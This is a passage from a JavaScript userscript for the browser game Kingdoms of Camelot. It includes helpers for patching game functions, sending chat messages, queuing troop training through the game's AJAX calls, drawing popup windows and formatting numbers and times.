        AutoUpdater_104137.check(GlobalOptions.pbupdate);
    } catch(e) {
        AutoUpdater_104137.check(GlobalOptions.pbupdate);
    }
} // END OF UPDATER

var CalterUwFunc = function (funcName, findReplace) {
  var t = this;
  this.isEnabled = false;
  this.isAvailable = isAvailable;
  this.setEnable = setEnable;
  this.funcOld = null;
  this.funcNew = null;
  try {
    var x = funcName.split('.');
    var f = unsafeWindow;
    for (var i=0; i<x.length; i++)
      f = f[x[i]];
    this.funcOld = f;
    var rt = f.toString().replace ('function '+ funcName, 'function');
    for (var i=0; i<findReplace.length; i++){
      x = rt.replace(findReplace[i][0], findReplace[i][1]);
      if (x == rt)  // if not found
        return;
      rt = x;
    }
    this.funcNew = rt;
  } catch (err) {
  }

  function setEnable (tf){
    if (t.funcNew == null)
      return;
    if (t.isEnabled != tf){
      if (tf){
        var scr = document.createElement('script');    // <== need to remove on disable!!!
        scr.innerHTML = funcName +' = '+ t.funcNew;
        document.body.appendChild(scr);
        setTimeout ( function (){document.body.removeChild(scr);}, 500);
        t.isEnabled = true;
      } else {
      var x = funcName.split('.');
      var f = unsafeWindow;
      for (var i=0; i<x.length-1; i++)
        f = f[x[i]];
      f[x[x.length-1]] = this.funcOld;
        t.isEnabled = false;
      }
    }
  }
  function isAvailable (){
    if (t.funcNew == null)
      return false;
    return true;
  }
};

var checkTournament = {
   init : function (){    var f = checkTournament;    f.e_eachMinute();   },
   minuteTimer : null,
   e_eachMinute : function (){   
     var f = checkTournament;
     var now = unixTime();
     row = [];
     if (Options.enableCheckTournoi)  {
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.format=2;
        params.tournyPos=0;
        new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getLeaderboard.php"+unsafeWindow.g_ajaxsuffix, {  method:"post",  parameters:params,
       onSuccess:function(transport){
         var rslt=eval("("+transport.responseText+")");
         if(rslt.ok){
          if(rslt.data){
	      document.getElementById('ptBoite2').innerHTML='<span style="color: #f66"><blink>'+culang.turn+'</blink></span><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="10" height="10" id="dewplayer1" name="dewplayer1"> \
              	   <param name="wmode" value="transparent" /> \
              	   <param name="movie" value="'+pdxMiniSWFplayer+'" />  \
              	   <param name="flashvars" value="mp3=http://www.universal-soundbank.com/mp3/sounds/7289.MP3&amp;autostart=1&amp;showtime=1&amp;volume=100" />';
	      
	      setTimeout (function() {
			var msg =""+culang.startTournament+"";
	       sendChat("/" + Seed.player.name + ' ' + msg);

	       
	      }, 1000);
	      Options.enableCheckTournoi = false;
	      saveOptions();
          }
          }
         }
        });
       f.minuteTimer = setTimeout (f.e_eachMinute, 600000);
     }
   },  
 } 
 
function makeButton20 (label){  var a = document.createElement('a');  a.className = "button20 ptButton20";  var s = document.createElement('span');  s.innerHTML = label;  a.appendChild (s);  return a;}
function createButton (label){ var a=document.createElement('a');  a.className='button20';  a.innerHTML='<span style="color: #fff">'+ label +'</span>';  return a;}
function createRedButton (label,id){  var a=document.createElement('a');  a.className='button20';  a.id = id;  a.innerHTML='<span style="color: #F71F02">'+ label +'</span>';  return a;}
function strButton20 (label, tags){
  if (tags == null)
    tags = '';
  return ('<TABLE class=ptNoPad><TR><TD><A class="button20 ptButton20" '+ tags +'><SPAN>'+ label +'</span></a></td></tr></table>' );
}
function strButton14 (label, tags){
  if (tags == null)
    tags = '';
  return ('<A class="button14 ptButton20" '+ tags +'><SPAN>'+ label +'</span></a>' );
}
function updatebotbutton(text, id){var but=document.getElementById(id);but.innerHTML = '<span style="color: #fff">'+text+'</span>';}
function reloadKOC (){
  var serverId = getServerId();
  if(serverId == '??') window.location.reload(true);
  var goto = window.location.protocol+'//apps.facebook.com/kingdomsofcamelot/?s='+serverId;
  if(document.URL.match(/standalone=1/i)){	goto = window.location.protocol+'//www.kabam.com/kingdoms-of-camelot/play?s='+serverId;  }
  var t = '<FORM target="_top" action="'+ goto +'" method=post><INPUT id=xxpbButReload type=submit value=RELOAD><INPUT type=hidden name=s value="'+ serverId +'"</form>';
  var e = document.createElement ('div');
  e.innerHTML = t;
  document.body.appendChild (e);
  setTimeout (function (){document.getElementById('xxpbButReload').click();}, 0);
}
function htmlSelector (valNameObj, curVal, tags){
  var m = [];
  m.push ('<SELECT');
  if (tags){ m.push (' '); m.push (tags);  }
  for (var k in valNameObj){
    m.push ('><OPTION ');
    if (k == curVal)
      m.push ('SELECTED ');
    m.push ('value="');
    m.push (k);
    m.push ('">');
    m.push (valNameObj[k]);
    m.push ('</option>');
  }
  m.push ('</select>');
  return m.join ('');
}

function cityStatusString (cs){
  if (cs==4)
    return ''+culang.vacation+'';
  if (cs==3)
    return ''+culang.truce+'';
  if (cs==2)
    return ''+culang.begProtection+'';
  return ''+culang.OwideOptnormal+'';
}

function sendChat (msg){  document.getElementById ("mod_comm_input").value = msg;  unsafeWindow.Chat.sendChat ();}
Chat = {  params : null,
  sendWhisper : function (msg, who, notify){    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);    this.params.ctype = 3;    this.params.name = who;    this._sendit (msg, notify);  },
  sendGlobal : function (msg, notify){    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);    this.params.ctype = 1;    this._sendit (msg, notify);  },
  sendAlliance : function (msg, notify){   this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);    this.params.ctype = 2;    this._sendit (msg, notify);  },
  _sendit : function (msg, notify){
    function strip(s) { return s.replace(/^\s+/, '').replace(/\s+$/, '');    }
    this.params.comment = strip (msg);
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/sendChat.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: this.params,
      onSuccess: function(transport) {
        if (notify)
          notify ();
      },
      onFailure: function(transport) {
        if (notify)
          notify ();
      }
    });
  },
}

function doDefTrain (cityId, unitId, num, notify){
  var time = unsafeWindow.modal_walls_traintime(unitId, num);
  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  params.cid = cityId;
  params.type = unitId;
  params.quant = num;
  params.items = 0;
  
  new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/fortify.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (rslt.ok) {
          unsafeWindow.seed.queue_fort["city" + cityId].push([unitId, num, rslt.initTS, parseInt(rslt.initTS) + time, 0, time, rslt.fortifyId]);
          if (notify != null)
            setTimeout (function (){notify(null);}, 500);
        } else {
          if (notify != null)
            setTimeout (function (){notify(rslt.errorMsg);}, 500);
        }
      },
      onFailure: function () {
        if (notify != null)
          notify(rslt.errorMsg);
      },
  });
}
function doTrain (cityId, tut, gamble, unitId, num, notify){
  var time = unsafeWindow.modal_barracks_traintime(unitId, num);
  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  params.cid = cityId;
  params.type = unitId;
  params.quant = num;
  params.items = tut;
  params.gambleId = gamble;
  
  new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/train.php" + unsafeWindow.g_ajaxsuffix, {
    method: "post",
    parameters: params,
    onSuccess: function(rslt) {
      if (rslt.ok) {
        for (var i = 1; i < 5; i++) {
		  var resourceLost = parseInt(unsafeWindow.unitcost["unt" + unitId][i]) * 3600 * parseInt(num);
		  if(rslt.gamble) resourceLost = resourceLost*rslt.gamble[i];
          unsafeWindow.seed.resources["city" + cityId]["rec" + i][0] = parseInt(unsafeWindow.seed.resources["city" + cityId]["rec" + i][0]) - resourceLost;
        }
        unsafeWindow.seed.citystats["city" + cityId].gold[0] = parseInt(unsafeWindow.seed.citystats["city" + cityId].gold[0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][5]) * parseInt(num);
        unsafeWindow.seed.citystats["city" + cityId].pop[0] = parseInt(unsafeWindow.seed.citystats["city" + cityId].pop[0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][6]) * parseInt(num);
        unsafeWindow.seed.queue_unt["city" + cityId].push([unitId, num, rslt.initTS, parseInt(rslt.initTS) + time, 0, time, null]);
        if (notify != null)
          setTimeout (function (){notify(null);}, 500);
      } else {
        if (notify != null){
          setTimeout (function (){notify(rslt.errorMsg);}, 500);
        }
      }
    },
     onFailure: function(rslt) {
      if (notify != null)
        notify(rslt.errorMsg);
    }
  });
}
function getAbsoluteOffsets (e){
  ret = {left:0, top:0};
  while (e.offsetParent){
    if (e.style.position == 'absolute')
      break;
    ret.left += e.offsetLeft;
    ret.top += e.offsetTop;
    e = e.offsetParent;
  }
  return ret;
}

DebugTimer = {
  startTime : 0,
  start : function (){  now = new Date();    DebugTimer.startTime = now.getTime();  },
  getMillis : function (){    now = new Date();    return now.getTime() - DebugTimer.startTime;  },
  display : function (label, noReset){ now = new Date();    elapsed = now.getTime() - DebugTimer.startTime;    logit (label +": "+ elapsed/1000);
    if (noReset===null || !noReset)
      DebugTimer.startTime = now.getTime();
  },
};

function debugPos  (e){  return '['+ e.tagName +'] client - offset: '+ e.clientLeft +','+ e.clientTop +','+ e.clientWidth +','+ e.clientHeight +' - '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' '+ e +' --OP--> '+ e.offsetParent;}

function CwaitForElement (id, timeout, notify){
  this.check = check;
  this.end = new Date().getTime() + timeout;
  var t = this;
  this.check();
  function check(){
    if (document.getElementById (id))
      notify (true);
    else if (new Date().getTime() > t.end)
      notify (false);
    else
      setTimeout (t.check, 250);
  }
}
function clickWin (win,obj,evtName) {  var evt = win.document.createEvent("MouseEvents");  evt.initMouseEvent(evtName, true, true, win, 0, 0, 0, 0, 0, false, false, false, false, 0, null);  return !obj.dispatchEvent(evt);}
function debugElement  (e){  var x = unsafeWindow.Object.clone (e.wrappedJSObject);  x.innerHTML = '';  x.innerText = '';  x.textContent = '';  return inspect (x, 1, 1);}
function searchDOM (node, condition, maxLevel, doMult){
  var found = [];
  eval ('var compFunc = function (node) { return ('+ condition +') }');
  doOne(node, 1);
  if(!doMult){
    if (found.length==0)
      return null;
    return found[0];
  }
  return found;
  function doOne (node, curLevel){
    try {
      if (compFunc(node))
        found.push(node);
    } catch (e){
    }
    if (!doMult && found.length>0)
      return;
    if (++curLevel<maxLevel && node.childNodes!=undefined)
      for (var c=0; c<node.childNodes.length; c++)
        doOne (node.childNodes[c], curLevel);
  }
}

function getClientCoords(e){
  if (e==null)
    return {x:null, y:null, width:null, height:null};
  var x=0, y=0;
  ret = {x:0, y:0, width:e.clientWidth, height:e.clientHeight};
  while (e.offsetParent != null){ ret.x += e.offsetLeft;    ret.y += e.offsetTop;    e = e.offsetParent;  }
  return ret;
}
function DOMtree (e, levels){
  var m = [];
  level (e, levels, 0);

  function level (e, levels, cur){
    try {
      for (var i=0; i<cur; i++)
        m.push('  ');
      if (!e.tagName)
        m.push ('?');
      else
        m.push (e.tagName);
      if (e.id){
        m.push (' id=');
        m.push (e.id);
      }
      if (e.name){
        m.push (' name=');
        m.push (e.name);
      }
      if (e.className){
        m.push (' class=');
        m.push (e.className);
      }
      if (e.style && e.style.display && e.style.display.indexOf('none')>0)
        m.push (' hidden');
       m.push ('\n');
      if (cur < levels){
        for (var c=0; c<e.childNodes.length; c++){
          level (e.childNodes[c], levels, cur+1);
        }
      }
    } catch (e) {
      m.push ('UNAVAILBLE!\n');
    }
  }
  return m.join('');
}
function parseIntNan (n){
  x = parseInt(n, 10);
  if (isNaN(x))
    return 0;
  return x;
}
function parseIntCommas (n){
  n = n.split(',');
  n = n.join('');
  x = parseInt(n, 10);
  if (isNaN(x))
    return 0;
  return x;
}
function parseIntZero (n){
  n = n.trim();
  if (n == '')
    return 0;
  return parseInt(n, 10);
}
function htmlTitleLine (msg){  return '<TABLE width=100% cellspacing=0><TR><TD style="padding:0px" width=50%><HR></td><TD style="padding:0px">[ '+ msg +' ]</td><TD style="padding:0px" width=50%><HR></td></tr></table>';}
var WinManager = {  wins : {}, didHide : [], get : function (prefix){ var t = WinManager; return t.wins[prefix];  },
  add : function (prefix, pop){
    var t = WinManager;
    t.wins[prefix] = pop;
    if (unsafeWindow.cpopupWins == null)
      unsafeWindow.cpopupWins = {};
    unsafeWindow.cpopupWins[prefix] = pop;
  },

  hideAll : function (){
    var t = WinManager;
    t.didHide = [];
    for (k in t.wins){
      if (t.wins[k].isShown()){
        t.didHide.push (t.wins[k]);
        t.wins[k].show (false);
      }
    }
  },
  restoreAll : function (){
    var t = WinManager;
    for (var i=0; i<t.didHide.length; i++)
      t.didHide[i].show (true);
  },

  delete : function (prefix){
    var t = WinManager;
    delete t.wins[prefix];
    delete unsafeWindow.cpopupWins[prefix];
  }
}
function CPopup (prefix, x, y, width, height, enableDrag, onClose) {  var pop = WinManager.get(prefix); if (pop){  pop.show (false);    return pop;  }
  this.BASE_ZINDEX = 111111;  this.show = show;  this.toggleHide = toggleHide;  this.getTopDiv = getTopDiv;  this.getMainTopDiv = getMainTopDiv;  this.getMainDiv = getMainDiv;  this.getLayer = getLayer;  this.setLayer = setLayer;  this.setEnableDrag = setEnableDrag;  this.getLocation = getLocation;  this.setLocation = setLocation;  this.focusMe = focusMe;  this.isShown = isShown;  this.unfocusMe = unfocusMe;  this.centerMe = centerMe;  this.destroy = destroy;  this.autoHeight = autoHeight;  this.div = document.createElement('div'); this.prefix = prefix;  this.onClose = onClose;  var t = this;  this.div.className = 'CPopup '+ prefix +'_CPopup';
  this.div.id = prefix +'_outer';
  this.div.style.background = 'url('+IMGpopupTop+') no-repeat #141516'; 
  this.div.style.zIndex = this.BASE_ZINDEX        // KOC modal is 100210 ?
  this.div.style.display = 'none';
  this.div.style.width = width + 'px';
  this.div.style.height = height + 'px';
  this.div.style.maxHeight = height + 'px';
  this.div.style.overflowY = 'show';
  this.div.style.position = "absolute";
  this.div.style.top = y +'px';
  this.div.style.left = x + 'px';

  if (CPopUpTopClass==null)
    topClass = 'CPopupTop '+ prefix +'_CPopupTop';
  else
    topClass = CPopUpTopClass +' '+ prefix +'_'+ CPopUpTopClass;

var m = '<TABLE cellspacing=0 ><TR id="'+ prefix +'_bar" class="'+ topClass +'" ><div valign=bottom class=enablePDXMenu>';
m += '<input src="'+IMGopenMenu+'" title="'+culang.showMenuBar+'" alt="'+culang.buttonon+'" type="image" value="'+culang.buttonon+'" onclick="if(document.getElementById(\'pb_top\').style.display=\'none\'){document.getElementById(\'pb_top\').style.display=\'block\'}else{document.getElementById(\'pb_top\').style.display=\'none\'}">';
m += '</div>';
m += '<TD width=100% style="background:none; border:none;" valign=bottom><SPAN id="'+ prefix +'_top" ></span></td>\
      <TD id='+ prefix +'_X align=right valign=middle onmouseover="this.style.cursor=\'pointer\'" style="width: 30px; margin-left: 715px; height:25px; border:none; background:transparent;"><img style="margin-bottom:5px;" width=25px height=25px src="'+IMGcloseButton+'" title="'+culang.close+'"></td></tr>\
      <TR><TD height=100% width=100%  valign=top class="CPopMain '+ prefix +'_CPopMain" colspan=2 id="'+ prefix +'_main"></td></tr></table>';

  document.body.appendChild(this.div);
  this.div.innerHTML = m;
  document.getElementById(prefix+'_X').addEventListener ('click', e_XClose, false);
  this.dragger = new CWinDrag (document.getElementById(prefix+'_bar'), this.div, enableDrag);
  this.div.addEventListener ('mousedown', e_divClicked, false);
  WinManager.add(prefix, this);

  function e_divClicked (){ t.focusMe(); }
  function e_XClose (){
    t.show(false);
    if (t.onClose != null)
      t.onClose();
  }
  function autoHeight (onoff){
    if (onoff)
      t.div.style.height = '';
    else
      t.div.style.height = t.div.style.maxHeight;
  }
  function focusMe (){ t.setLayer(5);
    for (k in unsafeWindow.cpopupWins){
      if (k != t.prefix)
        unsafeWindow.cpopupWins[k].unfocusMe();
    }
  }
  function unfocusMe (){ t.setLayer(-5); }
  function getLocation (){ return {x: parseInt(this.div.style.left), y: parseInt(this.div.style.top)}; }
  function setLocation (loc){ t.div.style.left = loc.x +'px'; t.div.style.top = loc.y +'px'; }
  function destroy (){ document.body.removeChild(t.div); WinManager.delete (t.prefix); }
  function centerMe (parent){
    if (parent == null){
      var coords = getClientCoords(document.body);
    } else
      var coords = getClientCoords(parent);
    var x = ((coords.width - parseInt(t.div.style.width)) / 2) + coords.x;
    var y = ((coords.height - parseInt(t.div.style.height)) / 2) + coords.y;
    if (x<0)
      x = 0;
    if (y<0)
      y = 0;
    t.div.style.left = x +'px';
    t.div.style.top = y +'px';
  }
  function setEnableDrag (tf){ t.dragger.setEnable(tf); }
  function setLayer(zi){ t.div.style.zIndex = ''+ (this.BASE_ZINDEX + zi); }
  function getLayer(){ return parseInt(t.div.style.zIndex) - this.BASE_ZINDEX; }
  function getTopDiv(){ return document.getElementById(this.prefix+'_top');  }
  function getMainTopDiv(){ return document.getElementById(this.prefix+'_top');  }
  function getMainDiv(){ return document.getElementById(this.prefix+'_main'); }
  function isShown (){ return t.div.style.display == 'block';  }
  function show(tf){ if (tf){  t.div.style.display = 'block'; t.focusMe (); } else { t.div.style.display = 'none'; } return tf;  }
  function toggleHide(t){ if (t.div.style.display == 'block') { return t.show (false); } else {  return t.show (true); }  }
}
function CWinDrag (clickableElement, movingDiv, enabled) {  var t=this;  this.setEnable = setEnable;  this.setBoundRect = setBoundRect;  this.debug = debug;  this.dispEvent = dispEvent;  this.lastX = null;  this.lastY = null;  this.enabled = true;  this.moving = false;  this.theDiv = movingDiv;  this.body = document.body;  this.ce = clickableElement;  this.moveHandler = new CeventMove(this).handler;  this.outHandler = new CeventOut(this).handler;  this.upHandler = new CeventUp(this).handler;  this.downHandler = new CeventDown(this).handler;  this.clickableRect = null;  this.boundRect = null;  this.bounds = null;  this.enabled = false;
  if (enabled == null)
    enabled = true;
  this.setEnable (enabled);
  function setBoundRect (b){ this.boundRect = boundRect; this.bounds = null;}
  function setEnable (enable){
    if (enable == t.enabled)
      return;
    if (enable){
      clickableElement.addEventListener('mousedown',  t.downHandler, false);
      t.body.addEventListener('mouseup', t.upHandler, false);
    } else {
      clickableElement.removeEventListener('mousedown', t.downHandler, false);
      t.body.removeEventListener('mouseup', t.upHandler, false);
    }
    t.enabled = enable;
  }
  function CeventDown (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.bounds == null){

        t.clickableRect = getClientCoords(clickableElement);
        t.bodyRect = getClientCoords(document.body);
        if (t.boundRect == null)
          t.boundRect = t.clickableRect;
        t.bounds = {top:10-t.clickableRect.height, bot:t.bodyRect.height-25, left:40-t.clickableRect.width, right:t.bodyRect.width-25};
      }
      if (me.button==0 && t.enabled){
        t.body.addEventListener('mousemove', t.moveHandler, true);
        t.body.addEventListener('mouseout', t.outHandler, true);
        t.lastX = me.clientX;
        t.lastY = me.clientY;
        t.moving = true;
      }
    }
  }
  function CeventUp  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (me.button==0 && t.moving)
        _doneMoving(t);
    }
  }
  function _doneMoving (t){ t.body.removeEventListener('mousemove', t.moveHandler, true); t.body.removeEventListener('mouseout', t.outHandler, true); t.moving = false; }
  function CeventOut  (that){ this.handler = handler; var t = that; function handler (me){ if (me.button==0){ t.moveHandler (me); }    }  }
  function CeventMove (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.enabled && !t.wentOut){
        var newTop = parseInt(t.theDiv.style.top) + me.clientY - t.lastY;
        var newLeft = parseInt(t.theDiv.style.left) + me.clientX - t.lastX;
        if (newTop < t.bounds.top){     // if out-of-bounds...
          newTop = t.bounds.top;
          _doneMoving(t);
        } else if (newLeft < t.bounds.left){
          newLeft = t.bounds.left;
          _doneMoving(t);
        } else if (newLeft > t.bounds.right){
          newLeft = t.bounds.right;
          _doneMoving(t);
        } else if (newTop > t.bounds.bot){
          newTop = t.bounds.bot;
          _doneMoving(t);
        }
        t.theDiv.style.top = newTop + 'px';
        t.theDiv.style.left = newLeft + 'px';
        t.lastX = me.clientX;
        t.lastY = me.clientY;
      }
    }
  }

  function debug  (msg, e){ logit ("*************** "+ msg +" ****************"); logit ('clientWidth, Height: '+ e.clientWidth +','+ e.clientHeight); logit ('offsetLeft, Top, Width, Height (parent): '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' ('+ e.offsetParent +')'); logit ('scrollLeft, Top, Width, Height: '+ e.scrollLeft +','+ e.scrollTop +','+ e.scrollWidth +','+ e.scrollHeight);  }
  function dispEvent (msg, me){ logit (msg + ' Button:'+ me.button +' Screen:'+ me.screenX +','+ me.screenY +' client:'+  me.clientX +','+ me.clientY +' rTarget: '+ me.relatedTarget);  }
}
function inspect(obj, maxLevels, level, doFunctions){
  var str = '', type, msg;
  if(level == null)  level = 0;
  if(maxLevels == null) maxLevels = 1;
  if(maxLevels < 1)
      return 'Inspect Error: Levels number must be > 0';
  if(obj == null)
    return ''+culang.Herror+': Object is NULL\n';
  var indent = '';
  for (var i=0; i<level; i++)
    indent += '  ';
  for(property in obj) {
    try {
        type =  matTypeof(obj[property]);
        if (doFunctions==true && (type == 'function')){
          str += indent + '(' + type + ') ' + property + "[FUNCTION]\n";
        } else if (type != 'function') {
          str += indent + '(' + type + ') ' + property + ( (obj[property]==null)?(': null'):('')) +' = '+ obj[property] +"\n";
        }
        if((type=='object' || type=='array') && (obj[property] != null) && (level+1 < maxLevels))
          str += inspect(obj[property], maxLevels, level+1, doFunctions);  // recurse
    }
    catch(err) {
      // Is there some properties in obj we can't access? Print it red.
      if(typeof(err) == 'string') msg = err;
      else if(err.message)        msg = err.message;
      else if(err.description)    msg = err.description;
      else                        msg = 'Unknown';
      str += '(Error) ' + property + ': ' + msg +"\n";
    }
  }
  str += "\n";
  return str;
}
Array.prototype.compare = function(testArr) { if (this.length != testArr.length) return false;  for (var i = 0; i < testArr.length; i++) { if (this[i].compare) { if (!this[i].compare(testArr[i])) return false; } if (this[i] !== testArr[i]) return false; } return true;}
String.prototype.StripQuotes = function() {return this.replace(/"/g,'');}
// String.prototype.entityTrans = { '&agrave;':'\\u00e0', '&eacute;':'\\u00e9', '&':'&amp;', '<':'&lt;',  '>':'&gt;',  '\"':'&quot;', '\'':'&#039', '<':'\\u003c', '/':'\\/', '\\':'\\\\', '\"':'\\\"'};
// String.prototype.entityTrans = { '&':'&amp;', '<':'&lt;',  '>':'&gt;',  '\"':'&quot;', '\'':'&#039', '<':'\\u003c', '/':'\\/', '\\':'\\\\', '\"':'\\\"'};
String.prototype.entityTrans = { '&':'&amp;', '<':'&lt;',  '>':'&gt;',  '\"':'&quot;', '\'':'&#039', '<':'\\u003c', '/':'\\/', '\\':'\\\\', '\"':'\\\"','{':'&#123;','}':'&#125;'};
String.prototype.htmlSpecialChars = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret  = ret.split(k).join(this.entityTrans[k]);
  return ret;
}
String.prototype.htmlSpecialCharsDecode = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret = ret.split(this.entityTrans[k]).join(k);
  return ret;
}
String.prototype.stripTags = function(){ return this.replace(/<\w+(\s+("[^"]*"|'[^']*'|[^>])+)?>|<\/\w+>/gi, '');}
String.prototype.trim = function () {    return this.replace(/^\s*/, "").replace(/\s*$/, "");}
String.prototype.capitalize = function(){  return this.charAt(0).toUpperCase() + this.substring(1).toLowerCase();}
function objectName (o){  var s = o.toString();  return s.substr(7,s.length-8);}
function tbodyScroller (tbody, maxHeight){
  tbody.style.maxHeight = '';
  tbody.style.height = '';
  tbody.style.overflowX = 'hidden';
  if (parseInt(tbody.clientHeight) > maxHeight){
    tbody.style.height = maxHeight + 'px';
    tbody.style.maxHeight = maxHeight + 'px';
    tbody.style.overflowY = 'auto';
  }
}
function getRemainingHeight (e, myDiv){  var ec = getClientCoords(e);  var cc = getClientCoords(myDiv);  return myDiv.clientHeight - (ec.y - cc.y);}
function addCommasInt(n){
  nStr = parseInt(n) + '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(nStr)) { nStr = nStr.replace(rgx, '$1' + ',' + '$2'); }
  return nStr;
}
function addCommas(nStr){ nStr += '';  x = nStr.split('.');  x1 = x[0];  x2 = x.length > 1 ? '.' + x[1] : '';  var rgx = /(\d+)(\d{3})/;  while (rgx.test(x1)) {  x1 = x1.replace(rgx, '$1' + ',' + '$2');  }  return x1 + x2;}
function thouormil(value){
  if (value==0)
    return 0;
  else if ((value%1000000)==0)
    return addCommas(value/1000000)+'m';
  else if ((value%1000)==0)
    return addCommas(value/1000)+'k';
  else
    return addCommas(value);
}
function addCommasWhole(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1;
}
function htmlSelector (valNameArray, curVal, tags){
  m = [];
  m.push ('<SELECT');
  if (tags){
    m.push (' ');
    m.push (tags);
  }
  for (k in valNameArray){
    m.push ('><OPTION ');
    if (k == curVal)
      m.push ('SELECTED ');
    m.push ('value="');
    m.push (k);
    m.push ('">');
    m.push (valNameArray[k]);
    m.push ('</option>');
  }
  m.push ('</select>');
  return m.join ('');
}
function getRallyPointLevel(cityID, returnLogicalLevel) {
  var RallypointLevel = 0;
  for (var o in Seed.buildings[cityID]){
    if (parseInt(Seed.buildings[cityID][o][0]) == 12){
      RallypointLevel=parseInt(Seed.buildings[cityID][o][1]);
      break;
    }
  }
  if (returnLogicalLevel && RallypointLevel == 11)
    RallypointLevel = 15;
  return RallypointLevel;
}
function unixTime (){ return parseInt (new Date().getTime() / 1000) + unsafeWindow.g_timeoff;}
function htmlOptions (a, curVal){
  m = '';
  for (k in a)
    m += '<OPTION value="'+ k +'"'+ (k==curVal?' SELECTED':'')  +'>'+ a[k] +'</option>';
  return m;
}
function getFunctionName (func){
  var name=/\W*function\s+([\w\$]+)\(/.exec(func);
  if (!name)
    return '';
  return name[1];
}
function findAllBetween (txt, find1, find2){
  var m = [];
  var last = 0;
  while ( (i1=txt.indexOf(find1, last))>=0 && (i2=txt.indexOf (find2, i1))>=0 ) {
    m.push (txt.substring(i1+find1.length, i2));
    last = i2 + find2.length;
  }
  return m;
}
function strUpTo (s, find){
  var i = s.indexOf(find);
  if (i > 0)
    return s.substr(0, i);
  return s;
}
function timestrShort(time) {
  time = parseInt (time);
  if (time > 86400){
    var m = [];
    time /= 3600;
    m.push (parseInt(time/24));
    m.push (''+culang.shrDays+' ');
    m.push (parseInt(time%24));
    m.push (''+culang.shrHour+' ');
    return m.join ('');
  } else
    return timestr (time);
}
function timestr(time, full) {
  time = parseInt (time);
  var m = [];
  var t = time;
  if (t < 61)
    return  t + ''+culang.shrSec+'';
  if (t > 86400){ m.push (parseInt(t/86400)); m.push (''+culang.shrDays+' '); t %= 86400; }
  if (t>3600 || time>3600){ m.push (parseInt(t/3600)); m.push (''+culang.shrHour+' '); t %= 3600; }
  m.push (parseInt(t/60));
  m.push (''+culang.shrMin+' ');
  if (full || time<=3600 ){ m.push (' '); m.push (t%60); m.push (''+culang.shrSec+'');  }
  return m.join ('');
}
function helpFriends() { function findFb (){ var kocForm = document.getElementById('claimhelpform');	if (!kocForm){ setTimeout (findFb, 1000); }	kocForm.submit(); }	 findFb(); }
function entier_1dec (nombre){ if (parseInt(nombre*10)!=0){ return parseInt(nombre*10)/10;	} else { return nombre;	}	}
function timestrcolon(time) { seconds = parseInt (time); var t, u; var secs86400 = seconds % 86400; var numhours = Math.floor(secs86400 / 3600); t = '00' + numhours; t = t.substr(t.length-2,2) + ':'; var numminutes = Math.floor((secs86400 % 3600) / 60); u = '00' + numminutes;	t += u.substr(u.length-2,2) + ':';	var numseconds = (secs86400 % 3600) % 60; u = '00' + numseconds;	t += u.substr(u.length-2,2); return t; }
var WINLOG_MAX_ENTRIES = 1000;     // TODO
var WinLog = { state : null, win: null, eOut : null, lastE : null, enabled : true,	reverse : true,	busy : false, isOpening : false,
  open : function (){ var t = WinLog;
    function eventButClear(){ var t = WinLog; t.lastE = null;  t.eOut.innerHTML =''; }
    function eventButReverse(){
      var t = WinLog;
      if (t.busy)
        return;
      t.busy = true;
      if (t.reverse){
        t.win.document.getElementById('wlRev').value= 'Top';
        t.reverse = false;
      } else{
        t.win.document.getElementById('wlRev').value= 'Bottom';
        t.reverse = true;
      }
      var n = t.eOut.childNodes.length;
      if (n < 2)
        return;
      for (i=n-2; i>=0; i--){
        t.eOut.appendChild (t.eOut.childNodes[i]);
      }
      t.busy = false;
    }
    if (!t.win || t.win.closed){
	t.isOpening = true;
	t.win = window.open('', 'uwtrace', 'top=30,left=0,width=900,height=700,scrollbars=no,location=no,menubar=no,directories=no,status=no');
	t.isOpening = false;
	t.state = null;
    }
    if (t.state == null){
      t.win.document.body.innerHTML = '<STYLE>pre{margin:0px} hr{margin:3px; height:1px; border:0px; color:#cee; background-color:#cee}</style><BODY style="margin:0px; padding:0px; border:none"><DIV id=winlogtop style="background-color:#d0d0d0; margin:0px; padding:0px; border:1px solid"><INPUT id=wlClear type=submit value="Clear"> &nbsp; <INPUT id=wlRev type=submit value="Bottom"></div><DIV id=wlOut style="overflow-y:auto; height:100%; max-height:100%"></div></body>';
      t.win.document.getElementById('wlClear').addEventListener('click', eventButClear, false);
      t.win.document.getElementById('wlRev').addEventListener('click', eventButReverse, false);
      t.eOut =  t.win.document.getElementById('wlOut');
      t.lastE = null;
      t.state = 1;
    }
  },
  writeText : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.write (msg.htmlSpecialChars());
  },
  write : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.open();
    var te = document.createElement('pre');
    var now = new Date();
    var m = [];
    var millis = now.getMilliseconds();
    m.push (now.toTimeString().substring (0,8));
    m.push ('.');
